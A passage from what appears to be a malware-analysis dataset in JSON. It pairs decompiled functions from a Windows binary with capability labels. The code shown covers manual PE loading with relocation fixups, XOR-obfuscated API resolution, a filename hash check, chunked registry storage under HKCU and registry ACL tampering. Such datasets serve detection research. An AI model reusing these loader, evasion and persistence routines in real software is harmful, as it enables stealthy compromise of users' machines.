        "decompiled_code": "\nuint __cdecl fcn.004112f0(uchar *arg_8h, uchar *arg_ch, uchar *arg_10h)\n\n{\n    int32_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uint var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uchar *var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(arg_ch + 0x3c);\n    var_14h = arg_ch + *(arg_ch + iVar3 + 0x14) + iVar3 + 0x18;\n    uVar2 = *(arg_ch + iVar3 + 6);\n    if (*(arg_ch + iVar3 + 4) == -0x799c) {\n        var_28h = *(arg_ch + iVar3 + 0x3c);\n    }\n    else {\n        var_28h = *(arg_ch + iVar3 + 0x3c);\n    }\n    puVar10 = arg_ch;\n    puVar11 = arg_8h;\n    if (*(arg_ch + iVar3 + 4) == -0x799c) {\n        iVar7 = *(arg_ch + iVar3 + 0x54);\n    }\n    else {\n        iVar7 = *(arg_ch + iVar3 + 0x54);\n    }\n    for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar11 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (var_ch = 0; var_ch < uVar2; var_ch = var_ch + 1) {\n        uVar6 = *(var_14h + 0x10) + -1 + var_28h & ~(var_28h - 1U);\n        if (uVar6 != 0) {\n            puVar10 = arg_ch + *(var_14h + 0x14);\n            puVar11 = arg_8h + *(var_14h + 0xc);\n            for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n                *puVar11 = *puVar10;\n                puVar10 = puVar10 + 1;\n                puVar11 = puVar11 + 1;\n            }\n        }\n        var_14h = var_14h + 0x28;\n    }\n    if (arg_10h == NULL) {\n        arg_10h = arg_8h;\n    }\n    if (*(arg_ch + iVar3 + 4) == -0x799c) {\n        iVar7 = iVar3 + 0xb0;\n    }\n    else {\n        iVar7 = iVar3 + 0xa0;\n    }\n    var_38h = arg_ch + iVar7;\n    if ((*var_38h != 0) && (var_18h = var_38h[1],  var_18h != 0)) {\n        if (*(arg_ch + iVar3 + 4) == -0x799c) {\n            var_54h = *(arg_ch + iVar3 + 0x30);\n        }\n        else {\n            var_54h = *(arg_ch + iVar3 + 0x34);\n        }\n        puVar10 = *(arg_ch + iVar3 + 0x30);\n        uVar6 = arg_10h - *(arg_ch + iVar3 + 0x30);\n        iVar3 = *(arg_ch + iVar3 + 0x34);\n        var_10h = arg_8h + *var_38h;\n        for (; 8 < var_18h; var_18h = var_18h - *piVar1) {\n            iVar7 = var_10h[1];\n            iVar4 = *var_10h;\n            if (var_10h[1] <= var_18h) {\n                for (var_ch = 0; var_ch < iVar7 - 8U >> 1; var_ch = var_ch + 1) {\n                    iVar9 = *(var_10h + var_ch * 2 + 8) >> 0xc;\n                    if (iVar9 == 3) {\n                        *(arg_8h + (*(var_10h + var_ch * 2 + 8) & 0xfff) + iVar4) =\n                             arg_10h + (*(arg_8h + (*(var_10h + var_ch * 2 + 8) & 0xfff) + iVar4) - var_54h);\n                    }\n                    else if (iVar9 == 10) {\n                        uVar8 = *(var_10h + var_ch * 2 + 8) & 0xfff;\n                        uVar5 = *(arg_8h + uVar8 + iVar4);\n                        iVar9 = *(arg_8h + uVar8 + iVar4 + 4);\n                        uVar8 = *(var_10h + var_ch * 2 + 8) & 0xfff;\n                        *(arg_8h + uVar8 + iVar4) = uVar5 + uVar6;\n                        *(arg_8h + uVar8 + iVar4 + 4) =\n                             iVar9 + (((arg_10h >> 0x1f) - iVar3) - (arg_10h < puVar10)) + CARRY4(uVar5, uVar6);\n                    }\n                }\n            }\n            piVar1 = var_10h + 1;\n            var_10h = var_10h + var_10h[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1431
    },
    "004119f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004119f0(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (arg_8h == 1) {\n        *0x436aec = 3;\n        fcn.004119e0();\n    }\n    fcn.00411a30(*0x436aec, 0, 0);\n    return;\n}\n",
        "token_count": 85
    },
    "00411a30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00411a30(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    *0x436af0 = arg_8h != 2;\n    *0x436aec = arg_8h;\n    *0x436af4 = arg_ch;\n    *0x436b00 = arg_10h;\n    if ((arg_8h == 4) || (arg_8h == 1)) {\n        *0x436afc = 0;\n    }\n    else {\n        *0x436afc = *0x43668c;\n        *0x43668c = *0x43668c + 1;\n    }\n    uVar1 = (*_sym.imp.ADVAPI32.dll_SetServiceStatus)(*0x436ae4, 0x436ae8, 1);\n    return uVar1;\n}\n",
        "token_count": 224
    },
    "00411ac0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00411ac0(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(*0x436b44, 0, 0x5c, param_1);\n    *0x436ae4 = (*_sym.imp.ADVAPI32.dll_RegisterServiceCtrlHandlerW)(iVar1 + 2, fcn.004119f0);\n    if (*0x436ae4 != 0) {\n        *0x436ae8 = 0x10;\n        *0x436af8 = 0;\n        fcn.00411a30(2, 0, 15000);\n        fcn.00411a30(4, 0, 15000);\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "00411cd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint fcn.00411cd0(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    while( true ) {\n        if ((&var_8h)[var_4h] == 0) {\n            return 0;\n        }\n        var_8h = (&var_8h)[var_4h];\n        iVar1 = fcn.00417810(var_8h);\n        if (iVar1 != 0) break;\n        var_4h = var_4h + 1;\n    }\n    return 1;\n}\n",
        "token_count": 167
    },
    "00413720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00413720(uint pszPath)\n\n{\n    uint uVar1;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int16_t *var_14h;\n    int16_t *var_10h;\n    int32_t var_ch;\n    int16_t *var_8h;\n    uint var_2h;\n    \n    var_10h = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(pszPath);\n    var_1ch = fcn.0041e3e0(var_10h, 0xffffffff);\n    var_44h = 0xbc136b46;\n    var_40h = 0xd84a20ac;\n    var_3ch = 0xeed889c4;\n    var_38h = 0x58636143;\n    var_34h = 0xc0f26006;\n    var_30h = 0x8606bedd;\n    var_2ch = 0xe8cbab78;\n    var_28h = 0x2ab6e04a;\n    var_24h = 0x31e6d1ea;\n    var_20h = 0;\n    var_8h = var_10h;\n    var_14h = var_10h + 1;\n    do {\n        var_2h._0_2_ = *var_8h;\n        var_8h = var_8h + 1;\n    } while (var_2h != 0);\n    var_18h = var_8h - (var_10h + 1) >> 1;\n    if (var_18h < 0x20) {\n        for (var_ch = 0; (&var_44h)[var_ch] != 0; var_ch = var_ch + 1) {\n            if (var_1ch == (&var_44h)[var_ch]) {\n                return 1;\n            }\n        }\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 562
    },
    "00413870": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00413870(void)\n\n{\n    uint uVar1;\n    uint var_8ch;\n    uint32_t var_84h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    code *var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uint8_t var_24h [4];\n    uchar var_20h;\n    uchar var_1fh;\n    uint var_1ch;\n    uchar var_18h;\n    uchar var_17h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_7ch = 0xf01faf00;\n    var_78h = 0x505600;\n    var_74h = 0x8002700;\n    var_70h = 0xc2900;\n    var_6ch = 0x56900;\n    var_68h = 0x3ff00;\n    var_64h = 0x1c4200;\n    var_60h = 0x163e00;\n    var_50h = 0;\n    var_30h._0_1_ = 0x6a;\n    var_30h._1_1_ = 0x1e;\n    var_30h._2_1_ = 0xc;\n    var_30h._3_1_ = 0x38;\n    var_2ch = 0x2d;\n    var_2bh = 0x5b;\n    var_2ah = 0x16;\n    var_29h = 0x2a;\n    var_28h = 0x23;\n    var_27h = 6;\n    var_26h = 0x79;\n    var_1ch._0_1_ = 0x38;\n    var_1ch._1_1_ = 0x4e;\n    var_1ch._2_1_ = 0x4f;\n    var_1ch._3_1_ = 0x6a;\n    var_18h = 0x79;\n    var_17h = 0x6f;\n    fcn.004012a0(0xb);\n    for (var_4h = 0; var_4h < 0xb; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_30h + var_4h) ^ *(&var_1ch + var_4h % 6));\n    }\n    var_48h._0_1_ = 0x30;\n    var_48h._1_1_ = 0x21;\n    var_48h._2_1_ = 0x5f;\n    var_48h._3_1_ = 0x29;\n    var_44h = 0x26;\n    var_43h = 0x10;\n    var_42h = 0;\n    var_41h = 0x35;\n    var_40h = 0x42;\n    var_3fh = 0x28;\n    var_3eh = 0x36;\n    var_3dh = 7;\n    var_3ch = 0x14;\n    var_3bh = 0x21;\n    var_3ah = 0x53;\n    var_39h = 0x23;\n    var_38h = 0x11;\n    var_37h = 0xb;\n    var_36h = 4;\n    var_35h = 0x38;\n    var_34h = 0x36;\n    var_24h[0] = 0x65;\n    var_24h[1] = 0x54;\n    var_24h[2] = 0x36;\n    var_24h[3] = 0x4d;\n    var_20h = 0x65;\n    var_1fh = 0x62;\n    fcn.004012a0(0x15);\n    for (var_8h = 0; var_8h < 0x15; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_48h + var_8h) ^ var_24h[var_8h % 6]);\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n    var_4ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (var_4ch == NULL) {\n        var_54h = 0;\n        fcn.004012d0();\n        fcn.004012d0();\n    }\n    else {\n        (*var_4ch)(&var_8ch);\n        stack0xffffff7a = stack0xffffff7a & 0xffffff;\n        var_58h = fcn.00411c90(stack0xffffff7a);\n        for (var_ch = 0; var_ch < 8; var_ch = var_ch + 1) {\n            if (var_58h == (&var_7ch)[var_ch]) {\n                var_50h = 1;\n            }\n        }\n        var_5ch = var_50h;\n        fcn.004012d0();\n        fcn.004012d0();\n        var_54h = var_5ch;\n    }\n    return var_54h;\n}\n",
        "token_count": 1508
    },
    "00413b50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00413b50(uint32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint ARG_0;\n    uint32_t var_60h;\n    uint var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uint8_t var_40h [4];\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uint var_34h;\n    uchar var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uint32_t *var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t hKey;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    var_24h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_8h = 0x7d000;\n    puVar2 = var_24h;\n    if ((((var_24h != NULL) && (arg_8h != NULL)) && (puVar2 = arg_8h,  *arg_8h != 0)) && (arg_8h[1] != 0)) {\n        hKey = 0;\n        var_5ch = 0x80000001;\n        fcn.004144c0(var_24h);\n        hKey = fcn.00414010(var_5ch, var_24h, 0x20006);\n        if (hKey != 0) {\n            var_60h = ((((*arg_8h - 1) + var_8h) / var_8h) * var_8h) / var_8h;\n            var_20h = *arg_8h;\n            puVar4 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            for (var_1ch = 0; var_1ch < 0x32; var_1ch = var_1ch + 1) {\n                var_40h[0] = 0x49;\n                var_40h[1] = 0x76;\n                var_40h[2] = 0x12;\n                var_40h[3] = 0x58;\n                var_3ch = 0x2b;\n                var_3bh = 0x6c;\n                var_3ah = 0x53;\n                var_39h = 0x61;\n                var_38h = 0x3c;\n                var_37h = 0x74;\n                var_36h = 0x6c;\n                var_35h = 0x76;\n                var_2ch._0_1_ = 0x6c;\n                var_2ch._1_1_ = 0x76;\n                var_2ch._2_1_ = 0x61;\n                var_2ch._3_1_ = 0x58;\n                var_28h = 0x74;\n                fcn.004012a0(0x18);\n                for (var_ch = 0; var_ch < 0xc; var_ch = var_ch + 1) {\n                    fcn.00401280(var_ch, var_40h[var_ch] ^ *(&var_2ch + var_ch % 5));\n                }\n                puVar4 = &ARG_0;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar1 = fcn.00401270(*0x436ba8, var_1ch);\n                (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, uVar1);\n                fcn.00413fe0(hKey, &ARG_0);\n                fcn.004012d0();\n            }\n            for (var_14h = 0; var_14h < var_60h; var_14h = var_14h + 1) {\n                var_4ch._0_1_ = 0x49;\n                var_4ch._1_1_ = 0x76;\n                var_4ch._2_1_ = 0x12;\n                var_4ch._3_1_ = 0x58;\n                var_48h = 0x2b;\n                var_47h = 0x6c;\n                var_46h = 0x53;\n                var_45h = 0x61;\n                var_44h = 0x3c;\n                var_43h = 0x74;\n                var_42h = 0x6c;\n                var_41h = 0x76;\n                var_34h._0_1_ = 0x6c;\n                var_34h._1_1_ = 0x76;\n                var_34h._2_1_ = 0x61;\n                var_34h._3_1_ = 0x58;\n                var_30h = 0x74;\n                fcn.004012a0(0x18);\n                for (var_10h = 0; var_10h < 0xc; var_10h = var_10h + 1) {\n                    fcn.00401280(var_10h, *(&var_4ch + var_10h) ^ *(&var_34h + var_10h % 5));\n                }\n                puVar4 = &ARG_0;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar1 = fcn.00401270(*0x436ba8, var_14h);\n                (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, uVar1);\n                if (var_20h < var_8h) {\n                    var_58h = var_20h;\n                }\n                else {\n                    var_58h = var_8h;\n                }\n                var_1h._0_1_ = fcn.00414640(hKey, &ARG_0, var_14h * var_8h + arg_8h[1], var_58h);\n                fcn.004012d0();\n                var_20h = var_20h - var_8h;\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_24h);\n        puVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return puVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1798
    },
    "00413e80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00413e80(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t hKey;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    hKey = 0;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    hKey = fcn.00414010(arg_ch, arg_10h, 0x20019);\n    if (hKey != 0) {\n        var_ch = 0;\n        var_10h = 0;\n        iVar1 = fcn.00413f20(hKey, arg_14h, &var_ch, &var_10h);\n        if (iVar1 != 0) {\n            arg_8h[1] = var_ch;\n            *arg_8h = var_10h;\n            var_1h._0_1_ = 1;\n        }\n        hKey = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return hKey & 0xffffff00 | var_1h;\n}\n",
        "token_count": 314
    },
    "00413f20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nbool __cdecl fcn.00413f20(uint hKey, uint lpValueName, int32_t *arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_10h = 3;\n    *arg_10h = 0;\n    *arg_14h = 0;\n    var_8h = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, lpValueName, 0, &var_10h, 0, &var_4h, 0);\n    if (var_8h == 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_4h);\n        var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((var_ch != 0) &&\n           (var_8h = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, lpValueName, 0, &var_10h, var_ch, &var_4h), \n           var_8h == 0)) {\n            *arg_10h = var_ch;\n            *arg_14h = var_4h;\n        }\n    }\n    return var_8h == 0;\n}\n",
        "token_count": 352
    },
    "00414010": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414010(uint hKey, uint lpSubKey, uint32_t arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((*0x436b50 & 1) != 0) {\n        arg_10h = arg_10h | 0x200;\n    }\n    if ((arg_10h & 0x20006) == 0) {\n        var_4h = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, lpSubKey, 0, arg_10h, &var_8h);\n    }\n    else {\n        var_4h = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(hKey, lpSubKey, 0, 0, 0, arg_10h, 0, &var_8h, 0);\n    }\n    if (var_4h != 0) {\n        var_8h = 0;\n    }\n    return var_8h;\n}\n",
        "token_count": 233
    },
    "00414090": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414090(uint hKey)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint auStack65636 [16380];\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint var_4ch;\n    uint *lpbDaclDefaulted;\n    uint *pAclInformation;\n    int32_t var_30h;\n    uint uStack48;\n    int32_t var_28h;\n    uint *lpbDaclPresent;\n    uint *lpcbSecurityDescriptor;\n    uint *pDacl;\n    int32_t nAclLength;\n    int32_t pSecurityDescriptor;\n    uint var_10h;\n    int32_t pAceList;\n    uint *dwAceIndex;\n    uint *hMem;\n    \n    hMem = 0x41409d;\n    sub.ntdll.dll__chkstk();\n    dwAceIndex = &stack0xfffeff9c;\n    lpcbSecurityDescriptor = 0x10014;\n    hMem = &fcn.00414090::lpcbSecurityDescriptor;\n    pAceList = 4;\n    var_10h = hKey;\n    pSecurityDescriptor = 0x4140c7;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegGetKeySecurity)();\n    if (iVar1 == 0) {\n        pSecurityDescriptor = 1;\n        nAclLength = var_10h;\n        pDacl = 0x4140de;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)();\n        if (iVar1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            pDacl = &fcn.00414090::lpbDaclDefaulted;\n            lpcbSecurityDescriptor = &fcn.00414090::pDacl;\n            lpbDaclPresent = &fcn.00414090::lpbDaclPresent;\n            var_28h = pSecurityDescriptor;\n            uStack48 = 0x4140ff;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_GetSecurityDescriptorDacl)();\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uStack48 = 2;\n                var_30h = 0xc;\n                pAclInformation = &fcn.00414090::pAclInformation;\n                lpbDaclDefaulted = pDacl;\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetAclInformation)();\n                if (iVar1 == 0) {\n                    uVar2 = 0;\n                }\n                else {\n                    nAclLength = var_30h + 0x10;\n                    hMem = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n                    iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeAcl)();\n                    if (iVar1 == 0) {\n                        (*_sym.imp.KERNEL32.dll_LocalFree)();\n                        uVar2 = 0;\n                    }\n                    else {\n                        if ((lpbDaclPresent != NULL) && (pAclInformation != NULL)) {\n                            for (dwAceIndex = NULL; dwAceIndex < pAclInformation; dwAceIndex = dwAceIndex + 1) {\n                                iVar1 = (*_sym.imp.ADVAPI32.dll_GetAce)();\n                                if (iVar1 == 0) {\n                                    (*_sym.imp.KERNEL32.dll_LocalFree)();\n                                    return 0;\n                                }\n                                var_28h = pAceList;\n                                *(pAceList + 4) = 0x80000000;\n                                uStack104 = 0xffffffff;\n                                uStack108 = 2;\n                                uStack112 = hMem;\n                                uStack116 = 0x4141df;\n                                iVar1 = (*_sym.imp.ADVAPI32.dll_AddAce)();\n                                if (iVar1 == 0) {\n                                    (*_sym.imp.KERNEL32.dll_LocalFree)();\n                                    return 0;\n                                }\n                            }\n                        }\n                        iVar1 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)();\n                        if (iVar1 == 0) {\n                            uStack104 = 0x414213;\n                            (*_sym.imp.KERNEL32.dll_LocalFree)();\n                            uVar2 = 0;\n                        }\n                        else {\n                            uStack104 = 4;\n                            uStack108 = hKey;\n                            uStack112 = 0x414227;\n                            iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetKeySecurity)();\n                            if (iVar1 == 0) {\n                                uStack112 = hMem;\n                                uStack116 = 0x414243;\n                                (*_sym.imp.KERNEL32.dll_LocalFree)();\n                                uVar2 = 1;\n                            }\n                            else {\n                                uStack112 = hMem;\n                                uStack116 = 0x414235;\n                                (*_sym.imp.KERNEL32.dll_LocalFree)();\n                                uVar2 = 0;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 1112
    },
    "00414250": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00414250(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    uint ARG_0;\n    uint var_3ch;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    int32_t var_30h;\n    uchar *var_2ch;\n    uint var_28h;\n    uchar var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t hKey;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if (var_ch != NULL) {\n        hKey = 0;\n        var_1ch = 0x80000001;\n        fcn.004144c0(var_ch);\n        hKey = fcn.00414010(var_1ch, var_ch, 0x20019);\n        if (hKey != 0) {\n            puVar4 = &ARG_0;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            var_2h._1_1_ = '\\0';\n            var_10h = 0;\n            do {\n                puVar4 = &var_30h;\n                for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n                puVar4 = &ARG_0;\n                for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n                var_3ch._0_1_ = 0x49;\n                var_3ch._1_1_ = 0x76;\n                var_3ch._2_1_ = 0x12;\n                var_3ch._3_1_ = 0x58;\n                var_38h = 0x2b;\n                var_37h = 0x6c;\n                var_36h = 0x53;\n                var_35h = 0x61;\n                var_34h = 0x3c;\n                var_33h = 0x74;\n                var_32h = 0x6c;\n                var_31h = 0x76;\n                var_28h._0_1_ = 0x6c;\n    